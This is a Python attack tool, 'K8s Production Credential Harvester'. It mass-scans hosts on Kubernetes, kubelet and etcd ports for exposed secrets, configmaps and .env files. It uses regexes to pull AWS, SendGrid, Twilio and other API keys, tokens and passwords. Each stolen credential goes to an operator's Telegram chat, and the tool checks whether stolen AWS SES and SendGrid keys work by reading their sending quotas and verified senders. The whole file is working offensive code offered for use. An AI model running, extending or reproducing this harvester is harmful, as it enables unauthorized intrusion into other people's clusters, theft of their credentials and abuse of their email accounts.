#!/usr/bin/env python3
"""
K8s Production Credential Harvester
Autonomous Kubernetes exploitation module with real-time API verification
Author: wKayaa | Production Ready | 2025-06-24
"""

import asyncio
import aiohttp
import json
import re
import base64
import hmac
import hashlib
import urllib.parse
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
import xml.etree.ElementTree as ET
import logging
import os
import yaml

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

@dataclass
class CredentialResult:
    """Structure for verified credentials"""
    type: str
    key: str
    secret: Optional[str] = None
    verified: bool = False
    permissions: List[str] = field(default_factory=list)
    quota_info: Dict[str, Any] = field(default_factory=dict)
    cluster_source: str = ""
    file_path: str = ""
    verification_time: str = ""

@dataclass
class ClusterTarget:
    """Kubernetes cluster target"""
    endpoint: str
    token: Optional[str] = None
    cert_path: Optional[str] = None
    accessible: bool = False
    privileged_access: bool = False

class CredentialExtractor:
    """Advanced credential extraction with regex patterns"""
    
    PATTERNS = {
        'aws_access_key': r'AKIA[0-9A-Z]{16}',
        'aws_secret_key': r'(?i)(?:secret.{0,20}|key.{0,20})["\']([A-Za-z0-9/+=]{40})["\']',
        'sendgrid_key': r'SG\.[a-zA-Z0-9_-]{22,}\.[a-zA-Z0-9_-]{43,}',
        'mailgun_key': r'key-[0-9a-zA-Z]{32}',
        'mailjet_key': r'[a-f0-9]{32}',
        'twilio_key': r'SK[0-9a-f]{32}',
        'brevo_key': r'xkeysib-[a-z0-9]{64}',
        'jwt_token': r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*',
        'bearer_token': r'Bearer\s+([A-Za-z0-9_-]{20,})',
        'api_key_generic': r'(?i)api.?key["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']'
    }
    
    def extract_credentials(self, content: str, source_path: str = "") -> List[Dict[str, str]]:
        """Extract all potential credentials from content"""
        credentials = []
        
        for cred_type, pattern in self.PATTERNS.items():
            matches = re.finditer(pattern, content)
            for match in matches:
                if cred_type == 'aws_secret_key':
                    key_value = match.group(1) if match.groups() else match.group(0)
                else:
                    key_value = match.group(0)
                
                credentials.append({
                    'type': cred_type,
                    'value': key_value,
                    'source': source_path,
                    'line': content[:match.start()].count('\n') + 1
                })
        
        return credentials

    def extract_aws_pairs(self, content: str) -> List[Tuple[str, str]]:
        """Extract AWS access key + secret key pairs"""
        access_keys = re.findall(self.PATTERNS['aws_access_key'], content)
        secret_keys = re.findall(self.PATTERNS['aws_secret_key'], content)
        
        pairs = []
        # Try to match keys that appear close to each other
        for access_key in access_keys:
            for secret_key in secret_keys:
                pairs.append((access_key, secret_key))
        
        return pairs

# ✅ NEW: Enhanced Perfect Hit Detector
class EnhancedPerfectHitDetector:
    """Enhanced detector for all credential types"""
    
    def __init__(self):
        self.hit_counter = 0
        self.patterns = {
            'aws_access_key': r'AKIA[0-9A-Z]{16}',
            'aws_secret_key': r'[A-Za-z0-9/+=]{40}',
            'sendgrid_key': r'SG\.[a-zA-Z0-9_-]{22,}\.[a-zA-Z0-9_-]{43,}',
            'jwt_token': r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*',
            'bearer_token': r'Bearer\s+([A-Za-z0-9_-]{20,})',
            'api_key': r'(?i)api.?key["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
            'password': r'(?i)password["\']?\s*[:=]\s*["\']([^"\']{8,})["\']',
            'secret': r'(?i)secret["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{16,})["\']'
        }
    
    def extract_any_credentials(self, content: str, source_url: str) -> Optional[Dict[str, Any]]:
        """Extract any type of credentials from content"""
        try:
            for cred_type, pattern in self.patterns.items():
                matches = re.finditer(pattern, content, re.IGNORECASE)
                for match in matches:
                    self.hit_counter += 1
                    confidence = self._calculate_confidence(cred_type, match.group(0), content)
                    
                    return {
                        'type': cred_type,
                        'value': match.group(0)[:50] + "..." if len(match.group(0)) > 50 else match.group(0),
                        'url': source_url,
                        'confidence': confidence,
                        'hit_id': self.hit_counter,
                        'timestamp': datetime.utcnow().isoformat()
                    }
            return None
        except Exception as e:
            print(f"❌ Detection error: {e}")
            return None
    
    def _calculate_confidence(self, cred_type: str, value: str, content: str) -> float:
        """Calculate confidence score for detected credential"""
        base_score = 70.0
        
        # Higher confidence for specific patterns
        if cred_type == 'aws_access_key' and value.startswith('AKIA'):
            base_score = 95.0
        elif cred_type == 'sendgrid_key' and value.startswith('SG.'):
            base_score = 90.0
        elif cred_type == 'jwt_token' and value.count('.') == 2:
            base_score = 85.0
        
        # Context boost
        sensitive_contexts = ['production', 'prod', 'live', 'api', 'secret', 'key']
        for context in sensitive_contexts:
            if context.lower() in content.lower():
                base_score += 5.0
                
        return min(base_score, 99.0)

# ✅ NEW: Enhanced Telegram Notifier
class TelegramEnhancedNotifier:
    """Enhanced Telegram notifier with proper error handling"""
    
    def __init__(self, token: str, chat_id: str):
        self.token = token
        self.chat_id = chat_id
        self.detector = EnhancedPerfectHitDetector()
        print(f"📱 Telegram Enhanced Notifier initialized: Chat {chat_id}")
    
    async def send_any_hit(self, credentials: Dict[str, Any], endpoint: str):
        """Send any credential hit to Telegram"""
        try:
            timestamp = datetime.utcnow().strftime('%H:%M:%S UTC')
            
            # ✅ FIX: Initialize text variable properly
            text = f"""🚨 <b>PERFECT HIT DETECTED</b> 🚨

🎯 Hit #{credentials['hit_id']}
🔑 Type: {credentials['type']}
💎 Value: <code>{credentials['value']}</code>
📊 Confidence: {credentials['confidence']:.1f}%

🌐 Source: {credentials['url']}
📄 Endpoint: {endpoint}
🕐 Time: {timestamp}

Operator: wKayaa | WWYV4Q Enhanced v3.1
"""
            
            await self._send_telegram_message(text)
            print(f"📱 TELEGRAM HIT SENT: {credentials['type']}")
            
        except Exception as e:
            print(f"📱 ❌ Send hit error: {e}")
    
    async def _send_telegram_message(self, text: str):
        """Send message to Telegram with proper error handling"""
        try:
            url = f"https://api.telegram.org/bot{self.token}/sendMessage"
            data = {
                "chat_id": self.chat_id,
                "text": text,
                "parse_mode": "HTML"
            }
            
            # ✅ FIX: Proper connector configuration without conflicts
            connector = aiohttp.TCPConnector(
                ssl=False,
                keepalive_timeout=30,
                limit=10
            )
            
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.post(url, json=data, timeout=10) as response:
                    if response.status == 200:
                        print(f"📱 ✅ TELEGRAM SENT - Hit #{self.detector.hit_counter}")
                    else:
                        print(f"📱 ❌ Telegram error: {response.status}")
                        
        except Exception as e:
            print(f"📱 ❌ Telegram exception: {e}")

class AWSCredentialVerifier:
    """Real-time AWS credential verification"""
    
    def __init__(self):
        self.region = 'us-east-1'
    
    def _sign_request(self, method: str, url: str, headers: Dict[str, str], 
                     payload: str, access_key: str, secret_key: str) -> Dict[str, str]:
        """Generate AWS Signature Version 4"""
        # Parse URL
        parsed_url = urllib.parse.urlparse(url)
        host = parsed_url.netloc
        uri = parsed_url.path or '/'
        query = parsed_url.query
        
        # Create canonical request
        canonical_headers = '\n'.join([f'{k.lower()}:{v}' for k, v in sorted(headers.items())]) + '\n'
        signed_headers = ';'.join(sorted([k.lower() for k in headers.keys()]))
        
        payload_hash = hashlib.sha256(payload.encode('utf-8')).hexdigest()
        canonical_request = f"{method}\n{uri}\n{query}\n{canonical_headers}\n{signed_headers}\n{payload_hash}"
        
        # Create string to sign
        timestamp = headers['X-Amz-Date']
        date = timestamp[:8]
        credential_scope = f"{date}/{self.region}/ses/aws4_request"
        string_to_sign = f"AWS4-HMAC-SHA256\n{timestamp}\n{credential_scope}\n{hashlib.sha256(canonical_request.encode('utf-8')).hexdigest()}"
        
        # Calculate signature
        def sign(key, msg):
            return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()
        
        k_date = sign(f"AWS4{secret_key}".encode('utf-8'), date)
        k_region = sign(k_date, self.region)
        k_service = sign(k_region, 'ses')
        k_signing = sign(k_service, 'aws4_request')
        signature = hmac.new(k_signing, string_to_sign.encode('utf-8'), hashlib.sha256).hexdigest()
        
        # Create authorization header
        authorization = f"AWS4-HMAC-SHA256 Credential={access_key}/{credential_scope}, SignedHeaders={signed_headers}, Signature={signature}"
        headers['Authorization'] = authorization
        
        return headers
    
    async def verify_ses_credentials(self, access_key: str, secret_key: str) -> Dict[str, Any]:
        """Verify AWS SES credentials and get quota"""
        try:
            url = f"https://email.{self.region}.amazonaws.com/"
            timestamp = datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')
            
            headers = {
                'Host': f'email.{self.region}.amazonaws.com',
                'X-Amz-Date': timestamp,
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            payload = "Action=GetSendQuota&Version=2010-12-01"
            headers = self._sign_request('POST', url, headers, payload, access_key, secret_key)
            
            # ✅ FIX: Proper connector configuration - no conflict
            connector = aiohttp.TCPConnector(
                ssl=False,
                keepalive_timeout=30,
                limit=10
            )
            
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.post(url, headers=headers, data=payload, timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()
                        # Parse XML response
                        root = ET.fromstring(content)
                        quota_data = {}
                        for elem in root.iter():
                            if elem.tag.endswith('Max24HourSend'):
                                quota_data['max_24_hour'] = elem.text
                            elif elem.tag.endswith('SentLast24Hours'):
                                quota_data['sent_last_24h'] = elem.text
                            elif elem.tag.endswith('MaxSendRate'):
                                quota_data['max_send_rate'] = elem.text
                        
                        return {
                            'verified': True,
                            'service': 'SES',
                            'quota': quota_data,
                            'permissions': ['ses:GetSendQuota']
                        }
                    else:
                        return {'verified': False, 'error': f'HTTP {response.status}'}
        
        except Exception as e:
            return {'verified': False, 'error': str(e)}

class SendGridVerifier:
    """SendGrid API credential verification"""
    
    async def verify_sendgrid_key(self, api_key: str) -> Dict[str, Any]:
        """Verify SendGrid API key and get account info"""
        try:
            headers = {
                'Authorization': f'Bearer {api_key}',
                'Content-Type': 'application/json'
            }
            
            # ✅ FIX: Proper connector configuration
            connector = aiohttp.TCPConnector(
                ssl=False,
                keepalive_timeout=30,
                limit=10
            )
            
            async with aiohttp.ClientSession(connector=connector) as session:
                # Check user credits
                async with session.get('https://api.sendgrid.com/v3/user/credits', 
                                     headers=headers, timeout=10) as response:
                    if response.status == 200:
                        credits_data = await response.json()
                        
                        # Get verified senders
                        senders = []
                        async with session.get('https://api.sendgrid.com/v3/verified_senders', 
                                             headers=headers, timeout=10) as sender_response:
                            if sender_response.status == 200:
                                sender_data = await sender_response.json()
                                senders = [sender.get('from_email', '') for sender in sender_data.get('results', [])]
                        
                        return {
                            'verified': True,
                            'service': 'SendGrid',
                            'credits': credits_data,
                            'senders': senders,
                            'permissions': ['user:read', 'verified_senders:read']
                        }
                    else:
                        return {'verified': False, 'error': f'HTTP {response.status}'}
        
        except Exception as e:
            return {'verified': False, 'error': str(e)}

# ✅ NEW: Main WWYVQv5TelegramFixed Class
class WWYVQv5TelegramFixed:
    """✅ FIXED: Main class with proper Telegram integration"""
    
    def __init__(self, config, telegram_token=None, telegram_chat_id=None):
        self.config = config
        self.stats = {
            "clusters_scanned": 0,
            "clusters_compromised": 0,
            "secrets_extracted": 0,
            "perfect_hits": 0,
            "session_start": datetime.utcnow().isoformat()
        }
        
        # ✅ FIX: Proper Telegram initialization
        if telegram_token and telegram_chat_id:
            self.telegram = TelegramEnhancedNotifier(telegram_token, telegram_chat_id)
            print("📱 Telegram Enhanced Hits: ENABLED")
        else:
            self.telegram = None
            print("📱 Telegram Enhanced Hits: DISABLED")
    
    async def run_exploitation(self, targets: List[str]) -> Dict[str, Any]:
        """Run complete exploitation with Telegram notifications"""
        print(f"🚀 Starting exploitation of {len(targets)} targets")
        
        # Send start notification
        if self.telegram:
            start_message = f"""🚀 <b>WWYV4Q MEGA HUNT STARTED</b>

📅 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}
👤 Operator: wKayaa
🎯 Targets: {len(targets)}
⚡ Mode: AGGRESSIVE MEGA SCALE

Ready for Perfect Hits! 💎"""
            
            await self.telegram._send_telegram_message(start_message)
        
        results = {
            "session_id": f"MEGA_{int(datetime.utcnow().timestamp())}",
            "targets_processed": 0,
            "compromised_clusters": {},
            "perfect_hits": [],
            "total_secrets": 0
        }
        
        # ✅ FIX: Proper connector configuration for scanning
        connector = aiohttp.TCPConnector(
            ssl=False,
            keepalive_timeout=30,
            limit=1000,
            limit_per_host=50
        )
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=10)
        ) as session:
            
            tasks = []
            for target in targets:
                task = self._scan_target(session, target, results)
                tasks.append(task)
            
            # Process in chunks to avoid overwhelming
            chunk_size = 100
            for i in range(0, len(tasks), chunk_size):
                chunk = tasks[i:i + chunk_size]
                await asyncio.gather(*chunk, return_exceptions=True)
                
                # Update progress
                results["targets_processed"] = min(i + chunk_size, len(targets))
                print(f"📊 Progress: {results['targets_processed']}/{len(targets)} targets processed")
        
        # Final statistics
        self.stats["clusters_scanned"] = len(targets)
        self.stats["clusters_compromised"] = len(results["compromised_clusters"])
        self.stats["perfect_hits"] = len(results["perfect_hits"])
        
        # Send completion notification
        if self.telegram:
            completion_message = f"""✅ <b>MEGA HUNT COMPLETED</b>

📊 <b>Results Summary:</b>
🔍 Targets Scanned: {self.stats['clusters_scanned']}
🔓 Clusters Compromised: {self.stats['clusters_compromised']}
💎 Perfect Hits: {self.stats['perfect_hits']}
🔐 Secrets Found: {results['total_secrets']}

🎯 Session: {results['session_id']}
⏰ Completed: {datetime.utcnow().strftime('%H:%M:%S UTC')}

wKayaa Hunt Complete! 🚀"""
            
            await self.telegram._send_telegram_message(completion_message)
        
        return results
    
    async def _scan_target(self, session: aiohttp.ClientSession, target: str, results: Dict[str, Any]):
        """Scan individual target for vulnerabilities"""
        try:
            # Common K8s ports and endpoints
            ports = [6443, 8443, 8080, 10250, 2379, 2380]
            endpoints = [
                "/api/v1/secrets", "/api/v1/configmaps", "/.env", 
                "/admin", "/metrics", "/debug", "/version",
                "/api/v1/namespaces/kube-system/secrets"
            ]
            
            for port in ports:
                base_url = f"https://{target}:{port}" if port in [6443, 8443] else f"http://{target}:{port}"
                
                for endpoint in endpoints:
                    try:
                        test_url = f"{base_url}{endpoint}"
                        async with session.get(test_url, ssl=False, timeout=5) as response:
                            if response.status == 200:
                                content = await response.text()
                                
                                # Check for credentials
                                if self.telegram:
                                    credentials = self.telegram.detector.extract_any_credentials(content, test_url)
                                    if credentials:
                                        await self.telegram.send_any_hit(credentials, endpoint)
                                        results["total_secrets"] += 1
                                        
                                        # Mark as compromised
                                        if target not in results["compromised_clusters"]:
                                            results["compromised_clusters"][target] = {
                                                "admin_access": True,
                                                "secrets_found": 1,
                                                "endpoints": [endpoint]
                                            }
                                        else:
                                            results["compromised_clusters"][target]["secrets_found"] += 1
                                            results["compromised_clusters"][target]["endpoints"].append(endpoint)
                                        
                                        # Track perfect hits
                                        if endpoint in ["/api/v1/secrets", "/api/v1/namespaces/kube-system/secrets"]:
                                            results["perfect_hits"].append({
                                                "target": target,
                                                "endpoint": endpoint,
                                                "credential_type": credentials["type"]
                                            })
                    
                    except asyncio.TimeoutError:
                        continue
                    except Exception:
                        continue
        
        except Exception as e:
            print(f"❌ Target scan error for {target}: {e}")
    
    def print_summary(self):
        """Print final summary"""
        print("\n" + "="*60)
        print("🚀 WWYV4Q MEGA HUNT SUMMARY")
        print("="*60)
        print(f"📊 Clusters Scanned: {self.stats['clusters_scanned']}")
        print(f"🔓 Clusters Compromised: {self.stats['clusters_compromised']}")
        print(f"💎 Perfect Hits: {self.stats['perfect_hits']}")
        print(f"🔐 Total Secrets: {self.stats['secrets_extracted']}")
        print("="*60)

# ✅ NEW: Export section for the class
__all__ = ['EnhancedPerfectHitDetector', 'TelegramEnhancedNotifier', 'WWYVQv5TelegramFixed', 'CredentialExtractor', 'AWSCredentialVerifier', 'SendGridVerifier']

if __name__ == "__main__":
    print("🚀 Telegram Perfect Hits Module - wKayaa Production")